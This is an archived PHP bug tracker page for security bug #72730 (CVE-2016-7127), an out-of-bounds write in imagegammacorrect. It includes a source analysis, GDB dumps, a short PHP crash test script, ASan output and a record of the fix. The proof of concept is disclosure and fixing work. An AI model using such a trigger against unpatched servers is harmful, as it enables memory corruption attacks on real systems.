@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='GD related Bug #72730 - RDF' href='rss/bug.php?id=72730'>
+        <link rel='alternate' type='application/rss+xml' title='GD related Bug #72730 - RSS 2.0' href='rss/bug.php?id=72730&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Sec Bug #72730 :: imagegammacorrect allows arbitrary write access</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=72730">Sec Bug</a>&nbsp;#72730</th>
+            <td id="summary" colspan="5">imagegammacorrect allows arbitrary write access</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2016-08-02 03:46 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2016-09-05 15:28 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>fernando &#x61;&#116; null-life &#x64;&#111;&#x74; com</td>
+            <th class="details">Assigned:</th>
+            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=GD+related">GD related</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>5.6.24</td>
+            <th class="details">OS:</th>
+            <td>*</td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7127" target="_blank">2016-7127</a></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=72730&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=72730&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=72730&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1470109584">&nbsp;</a><strong>[2016-08-02 03:46 UTC] fernando &#x61;&#116; null-life &#x64;&#111;&#x74; com</strong>
+<pre class='note'>Description:
+------------
+Description:
+------------
+imagegammacorrect accepts two gamma values, if they don't have the same sign then the palette colors will be assigned values bigger than 0xFF, later this values are used to calculate the transparent color using the gdTrueColorAlpha macro, and a negative value will be assigned to the transparent color. 
+
+This negative value is used as an index and allows writing an arbitrary null, similar to <a href='bug.php?id=72512'>bug #72512</a> 
+
+This doesn't affect libgd upstream, gamma correction is only implemented in PHP.
+
+Possible fix
+------------
+Don't accept negative values on imagegammacorrect
+
+
+Details
+-------
+Source code:
+
+<a href="https://github.com/php/php-src/blob/master/ext/gd/gd.c#L3024" rel="nofollow">https://github.com/php/php-src/blob/master/ext/gd/gd.c#L3024</a>
+
+PHP_FUNCTION(imagegammacorrect)
+{
+        zval *IM;
+        gdImagePtr im;
+        int i;
+        double input, output;
+
+        if (zend_parse_parameters(ZEND_NUM_ARGS(), &quot;rdd&quot;, &amp;IM, &amp;input, &amp;output) == FAILURE) {
+                return;
+        }
+
+        if ((im = (gdImagePtr)zend_fetch_resource(Z_RES_P(IM), &quot;Image&quot;, le_gd)) == NULL) {
+                RETURN_FALSE;
+        }
+
+        if (gdImageTrueColor(im))       {
+                int x, y, c;
+
+                for (y = 0; y &lt; gdImageSY(im); y++)     {
+                        for (x = 0; x &lt; gdImageSX(im); x++)     {
+                                c = gdImageGetPixel(im, x, y);
+                                gdImageSetPixel(im, x, y,
+                                        gdTrueColorAlpha(
+                                                (int) ((pow((pow((gdTrueColorGetRed(c)   / 255.0), input)), 1.0 / output) * 255) + .5),
+                                                (int) ((pow((pow((gdTrueColorGetGreen(c) / 255.0), input)), 1.0 / output) * 255) + .5),
+                                                (int) ((pow((pow((gdTrueColorGetBlue(c)  / 255.0), input)), 1.0 / output) * 255) + .5),
+                                                gdTrueColorGetAlpha(c)
+                                        )
+                                );
+                        }
+                }
+                RETURN_TRUE;
+        }
+
+        for (i = 0; i &lt; gdImageColorsTotal(im); i++) {
+                im-&gt;red[i]   = (int)((pow((pow((im-&gt;red[i]   / 255.0), input)), 1.0 / output) * 255) + .5);
+                im-&gt;green[i] = (int)((pow((pow((im-&gt;green[i] / 255.0), input)), 1.0 / output) * 255) + .5);
+                im-&gt;blue[i]  = (int)((pow((pow((im-&gt;blue[i]  / 255.0), input)), 1.0 / output) * 255) + .5);
+        }
+
+        RETURN_TRUE;
+}
+
+
+The line that calculates the rgb values generates a value bigger than 255, let's analyze red for example:
+
+ im-&gt;red[i]   = (int)((pow((pow((im-&gt;red[i]   / 255.0), input)), 1.0 / output) * 255) + .5);
+
+This formula is:
+
+[[r/255] ^ input ] ^ (1 / output) 
+
+ [r/255] ^ (input / output)
+
+If one of these two is negatives then it becomes:
+
+[255/r] ^ (input / output)
+
+We control r, input and output, and we can make the new value bigger than 255.
+
+
+GDB output
+----------
+Before imagegamacorrect:
+
+Breakpoint 5, gdImageTrueColorToPaletteBody (oim=0x7fffef678000, dither=&lt;optimized out&gt;, colorsWanted=&lt;optimized out&gt;, cimP=0x0) at /home/operac/php-70/ext/gd/libgd/gd_topal.c:2015
+2015        oim-&gt;tpixels = 0;
+gdb-peda$ p *oim
+$2 = {
+  pixels = 0x7fffef6730f0,
+  sx = 0x1,
+  sy = 0x1,
+  colorsTotal = 0x2,
+  red = {0x4, 0xb, 0x0 &lt;repeats 254 times&gt;},
+  green = {0x2, 0xc, 0x0 &lt;repeats 254 times&gt;},
+  blue = {0x4, 0xd, 0x0 &lt;repeats 254 times&gt;},
+  open = {0x0 &lt;repeats 256 times&gt;},
+  transparent = 0x1,
+  polyInts = 0x0,
+  polyAllocated = 0x0,
+  brush = 0x0,
+  tile = 0x0,
+  brushColorMap = {0x0 &lt;repeats 256 times&gt;},
+  tileColorMap = {0x0 &lt;repeats 256 times&gt;},
+  styleLength = 0x0,
+  stylePos = 0x0,
+  style = 0x0,
+  interlace = 0x0,
+  thick = 0x1,
+  alpha = {0x0, 0x7f, 0x0 &lt;repeats 254 times&gt;},
+  trueColor = 0x0,
+  tpixels = 0x7fffef673050,
+  alphaBlendingFlag = 0x1,
+  antialias = 0x0,
+  saveAlphaFlag = 0x0,
+  AA = 0x0,
+  AA_color = 0x0,
+  AA_dont_blend = 0x0,
+  AA_opacity = 0x7fffef673078,
+  AA_polygon = 0x0,
+  AAL_x1 = 0x0,
+  AAL_y1 = 0x0,
+  AAL_x2 = 0x0,
+  AAL_y2 = 0x0,
+  AAL_Bx_Ax = 0x0,
+  AAL_By_Ay = 0x0,
+  AAL_LAB_2 = 0x0,
+  AAL_LAB = 0,
+  cx1 = 0x0,
+  cy1 = 0x0,
+  cx2 = 0x0,
+  cy2 = 0x0,
+  interpolation_id = GD_BILINEAR_FIXED,
+  interpolation = 0x0
+}
+gdb-peda$ c
+
+
+After gammacorrect:
+
+Breakpoint 3, gdImagePaletteToTrueColor (src=0x7fffef678000) at /home/operac/php-70/ext/gd/libgd/gd.c:3107
+3107            if (src == NULL) {
+gdb-peda$ p *src
+$3 = {
+  pixels = 0x7fffef6730f0,
+  sx = 0x1,
+  sy = 0x1,
+  colorsTotal = 0x2,
+  red = {0x100, 0x100, 0x0 &lt;repeats 254 times&gt;},            // colors palette &gt; 0xff
+  green = {0x100, 0x100, 0x0 &lt;repeats 254 times&gt;},
+  blue = {0x100, 0x100, 0x0 &lt;repeats 254 times&gt;},
+  open = {0x0 &lt;repeats 256 times&gt;},
+  transparent = 0x1,
+  polyInts = 0x0,
+  polyAllocated = 0x0,
+  brush = 0x0,
+  tile = 0x0,
+  brushColorMap = {0x0 &lt;repeats 256 times&gt;},
+  tileColorMap = {0x0 &lt;repeats 256 times&gt;},
+  styleLength = 0x0,
+  stylePos = 0x0,
+  style = 0x0,
+  interlace = 0x0,
+  thick = 0x1,
+  alpha = {0x0, 0x7f, 0x0 &lt;repeats 254 times&gt;},
+  trueColor = 0x0,
+  tpixels = 0x0,
+  alphaBlendingFlag = 0x1,
+  antialias = 0x0,
+  saveAlphaFlag = 0x0,
+  AA = 0x0,
+  AA_color = 0x0,
+  AA_dont_blend = 0x0,
+  AA_opacity = 0x7fffef673078,
+  AA_polygon = 0x0,
+  AAL_x1 = 0x0,
+  AAL_y1 = 0x0,
+  AAL_x2 = 0x0,
+  AAL_y2 = 0x0,
+  AAL_Bx_Ax = 0x0,
+  AAL_By_Ay = 0x0,
+  AAL_LAB_2 = 0x0,
+  AAL_LAB = 0,
+  cx1 = 0x0,
+  cy1 = 0x0,
+  cx2 = 0x0,
+  cy2 = 0x0,
+  interpolation_id = GD_BILINEAR_FIXED,
+  interpolation = 0x0
+}
+
+...
+
+After imagepalettetotruecolor:
+
+Breakpoint 4, php_gd_gdImageTrueColorToPalette (im=0x7fffef678000, dither=0x1, colorsWanted=0xa) at /home/operac/php-70/ext/gd/libgd/gd_topal.c:1767
+1767    {
+gdb-peda$ p *im
+$4 = {
+  pixels = 0x0,
+  sx = 0x1,
+  sy = 0x1,
+  colorsTotal = 0x2,
+  red = {0x100, 0x100, 0x0 &lt;repeats 254 times&gt;},
+  green = {0x100, 0x100, 0x0 &lt;repeats 254 times&gt;},
+  blue = {0x100, 0x100, 0x0 &lt;repeats 254 times&gt;},
+  open = {0x0 &lt;repeats 256 times&gt;},
+  transparent = 0x80010100,         // transparent &gt; 0x7fffffff (negative)
+  polyInts = 0x0,
+  polyAllocated = 0x0,
+  brush = 0x0,
+  tile = 0x0,
+  brushColorMap = {0x0 &lt;repeats 256 times&gt;},
+  tileColorMap = {0x0 &lt;repeats 256 times&gt;},
+  styleLength = 0x0,
+  stylePos = 0x0,
+  style = 0x0,
+  interlace = 0x0,
+  thick = 0x1,
+  alpha = {0x0, 0x7f, 0x0 &lt;repeats 254 times&gt;},
+  trueColor = 0x1,
+  tpixels = 0x7fffef673050,
+  alphaBlendingFlag = 0x0,
+  antialias = 0x0,
+  saveAlphaFlag = 0x1,
+  AA = 0x0,
+  AA_color = 0x0,
+  AA_dont_blend = 0x0,
+  AA_opacity = 0x7fffef673078,
+  AA_polygon = 0x0,
+  AAL_x1 = 0x0,
+  AAL_y1 = 0x0,
+  AAL_x2 = 0x0,
+  AAL_y2 = 0x0,
+  AAL_Bx_Ax = 0x0,
+  AAL_By_Ay = 0x0,
+  AAL_LAB_2 = 0x0,
+  AAL_LAB = 0,
+  cx1 = 0x0,
+  cy1 = 0x0,
+  cx2 = 0x0,
+  cy2 = 0x0,
+  interpolation_id = GD_BILINEAR_FIXED,
+  interpolation = 0x0
+}
+
+gdb-peda$ p/d im-&gt;transparent
+$6 = -2147417856
+-----------------------------------------
+
+...
+<a href="https://github.com/php/php-src/blob/dda0ea9b3af0c392be8d850ccdbe8a1bfa2badb6/ext/gd/libgd/gd.c#L3155" rel="nofollow">https://github.com/php/php-src/blob/dda0ea9b3af0c392be8d850ccdbe8a1bfa2badb6/ext/gd/libgd/gd.c#L3155</a>
+
+int gdImagePaletteToTrueColor(gdImagePtr src)
+{
+...
+        if (src-&gt;transparent &gt;= 0) {
+                const unsigned char c = src-&gt;transparent;
+                src-&gt;transparent =  gdTrueColorAlpha(src-&gt;red[c], src-&gt;green[c], src-&gt;blue[c], src-&gt;alpha[c]);
+        }
+...
+
+<a href="https://github.com/php/php-src/blob/1c295d4a9ac78fcc2f77d6695987598bb7abcb83/ext/gd/libgd/gd.h#L541" rel="nofollow">https://github.com/php/php-src/blob/1c295d4a9ac78fcc2f77d6695987598bb7abcb83/ext/gd/libgd/gd.h#L541</a>
+
+
+#define gdTrueColorAlpha(r, g, b, a) (((a) &lt;&lt; 24) + \
+        ((r) &lt;&lt; 16) + \
+        ((g) &lt;&lt; 8) + \
+        (b))
+
+7f000000   alpha
+ 1000000   red
+   10000   green
+     100   blue
+-----------------
+80010100 
+
+This is the negative color that was assigned to transparent.
+
+Test script:
+---------------
+&lt;?php
+$img =  imagecreatetruecolor(1, 1);
+
+imagecolortransparent($img, 0x0a0b0c0d);   # if color &gt;= 0  -&gt;  img-&gt;transparent = 0x0a0b0c0d
+imagetruecolortopalette($img, true,  10);  # if transparent &gt;=0 -&gt; r[i]=0x0b  g[i]=0x0c b[i]=0x0d; a[i] = gdAlphaTransparent (0x7f);  img-&gt;transparent = i  
+imagegammacorrect($img, -1, 1337);   # rgb becomes negative =&gt; (int)((pow((pow((im-&gt;red[i]   / 255.0), input)), 1.0 / output) * 255) + .5);
+imagepalettetotruecolor($img);       # if transparent &gt;=0  const unsigned char c = src-&gt;transparent;  src-&gt;transparent =  gdTrueColorAlpha(src-&gt;red[c], src-&gt;green[c], src-&gt;blue[c], src-&gt;alpha[c]);
+imagetruecolortopalette($img, true, 10);   # if transparent &gt;=0 =&gt;  r[i]=0x0b   g[i]=0x0c   b[i]=0x0d; a[i] = gdAlphaTransparent (0x7f);    img-&gt;transparent = i  
+imagecolortransparent($img, 0);      # if color &gt;=0 &amp;&amp; color &lt; colorsTotal =&gt; im-&gt;alpha[im-&gt;transparent] = gdAlphaOpaque (0x0);
+
+
+Expected result:
+----------------
+No crash
+
+Actual result:
+--------------
+ASan output:
+
+ASAN:SIGSEGV
+=================================================================
+==7112==ERROR: AddressSanitizer: SEGV on unknown address 0x7f96b96b9c50 (pc 0x00000098c960 bp 0x7ffcb18d91e0 sp 0x7ffcb18d91e0 T0)
+    #0 0x98c95f in php_gd_gdImageColorTransparent /home/operac/php-70/ext/gd/libgd/gd.c:609
+    #1 0x95b50c in zif_imagecolortransparent /home/operac/php-70/ext/gd/gd.c:3311
+    #2 0x1da38da in ZEND_DO_ICALL_SPEC_HANDLER /home/operac/php-70/Zend/zend_vm_execute.h:586
+    #3 0x1b4c335 in execute_ex /home/operac/php-70/Zend/zend_vm_execute.h:414
+    #4 0x1df9dc8 in zend_execute /home/operac/php-70/Zend/zend_vm_execute.h:458
+    #5 0x194764a in zend_execute_scripts /home/operac/php-70/Zend/zend.c:1427
+    #6 0x16b8347 in php_execute_script /home/operac/php-70/main/main.c:2494
+    #7 0x1e02126 in do_cli /home/operac/php-70/sapi/cli/php_cli.c:974
+    #8 0x467378 in main /home/operac/php-70/sapi/cli/php_cli.c:1344
+    #9 0x7f98bf19382f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
+    #10 0x467a48 in _start (/ramdisk/php-fuzz/phuzzer/php-70/sapi/cli/php+0x467a48)
+
+AddressSanitizer can not provide additional info.
+SUMMARY: AddressSanitizer: SEGV /home/operac/php-70/ext/gd/libgd/gd.c:609 php_gd_gdImageColorTransparent
+==7112==ABORTING
+
+</pre>
+</div><h2>Patches</h2>
+<p><a href='patch-add.php?bug_id=72730'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=72730'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_log' ><a name="1470813379">&nbsp;</a><strong>[2016-08-10 07:16 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-PHP Version: 7.0.9</span>
+<span class="added">+PHP Version: 5.6.24</span>
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: stas</span>
+</div></div></div><div class='comment type_comment' ><a name="1470813379">&nbsp;</a><strong>[2016-08-10 07:16 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Fixed in 047fe0ed03093a496691d376fcf51a7e2f1d04b0 and <a href="https://gist.github.com/8d67aca5d29866ca35b16c80bbe01c4f" rel="nofollow">https://gist.github.com/8d67aca5d29866ca35b16c80bbe01c4f</a>
+
+please verify
+</pre>
+</div><div class='comment type_log' ><a name="1471240935">&nbsp;</a><strong>[2016-08-15 06:02 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-CVE-ID:</span>
+<span class="added">+CVE-ID: needed</span>
+</div></div></div><div class='comment type_svn' ><a name="1471413439">&nbsp;</a><strong>[2016-08-17 05:57 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=1bd103df00f49cf4d4ade2cfe3f456ac058a4eae" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=1bd103df00f49cf4d4ade2cfe3f456ac058a4eae</a>
+Log: Fix <a href='bug.php?id=72730'>bug #72730</a> - imagegammacorrect allows arbitrary write access
+</pre>
+</div><div class='comment type_log' ><a name="1471413439">&nbsp;</a><strong>[2016-08-17 05:57 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Assigned</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class='comment type_svn' ><a name="1471422215">&nbsp;</a><strong>[2016-08-17 08:23 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=1bd103df00f49cf4d4ade2cfe3f456ac058a4eae" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=1bd103df00f49cf4d4ade2cfe3f456ac058a4eae</a>
+Log: Fix <a href='bug.php?id=72730'>bug #72730</a> - imagegammacorrect allows arbitrary write access
+</pre>
+</div><div class='comment type_svn' ><a name="1471422227">&nbsp;</a><strong>[2016-08-17 08:23 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=e70069a62fb7252252cad9506fac5baf4ac11d21" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=e70069a62fb7252252cad9506fac5baf4ac11d21</a>
+Log: Fix <a href='bug.php?id=72730'>bug #72730</a> - imagegammacorrect allows arbitrary write access
+</pre>
+</div><div class='comment type_svn' ><a name="1471425333">&nbsp;</a><strong>[2016-08-17 09:15 UTC] <a href="//people.php.net/laruence">laruence@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=1bd103df00f49cf4d4ade2cfe3f456ac058a4eae" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=1bd103df00f49cf4d4ade2cfe3f456ac058a4eae</a>
+Log: Fix <a href='bug.php?id=72730'>bug #72730</a> - imagegammacorrect allows arbitrary write access
+</pre>
+</div><div class='comment type_svn' ><a name="1471425344">&nbsp;</a><strong>[2016-08-17 09:15 UTC] <a href="//people.php.net/laruence">laruence@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=e70069a62fb7252252cad9506fac5baf4ac11d21" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=e70069a62fb7252252cad9506fac5baf4ac11d21</a>
+Log: Fix <a href='bug.php?id=72730'>bug #72730</a> - imagegammacorrect allows arbitrary write access
+</pre>
+</div><div class='comment type_svn' ><a name="1471435447">&nbsp;</a><strong>[2016-08-17 12:04 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=bab470f6ba67f5b2e83d8152ae9adee5161a975e" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=bab470f6ba67f5b2e83d8152ae9adee5161a975e</a>
+Log: Fix <a href='bug.php?id=72730'>bug #72730</a> - imagegammacorrect allows arbitrary write access
+</pre>
+</div><div class='comment type_svn' ><a name="1471518908">&nbsp;</a><strong>[2016-08-18 11:15 UTC] <a href="//people.php.net/tyrael">tyrael@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=229782c0ada4d7e72dba6327cc7dff889ce7d92f" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=229782c0ada4d7e72dba6327cc7dff889ce7d92f</a>
+Log: Fix <a href='bug.php?id=72730'>bug #72730</a> - imagegammacorrect allows arbitrary write access
+</pre>
+</div><div class='comment type_log' ><a name="1473089314">&nbsp;</a><strong>[2016-09-05 15:28 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-CVE-ID: needed</span>
+<span class="added">+CVE-ID: 2016-7127</span>
+</div></div></div><div class='comment type_svn' ><a name="1476698971">&nbsp;</a><strong>[2016-10-17 10:09 UTC] <a href="//people.php.net/bwoebi">bwoebi@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=1bd103df00f49cf4d4ade2cfe3f456ac058a4eae" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=1bd103df00f49cf4d4ade2cfe3f456ac058a4eae</a>
+Log: Fix <a href='bug.php?id=72730'>bug #72730</a> - imagegammacorrect allows arbitrary write access
+</pre>
+</div><div class='comment type_svn' ><a name="1476698985">&nbsp;</a><strong>[2016-10-17 10:09 UTC] <a href="//people.php.net/bwoebi">bwoebi@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=e70069a62fb7252252cad9506fac5baf4ac11d21" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=e70069a62fb7252252cad9506fac5baf4ac11d21</a>
+Log: Fix <a href='bug.php?id=72730'>bug #72730</a> - imagegammacorrect allows arbitrary write access
+</pre>
+</div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
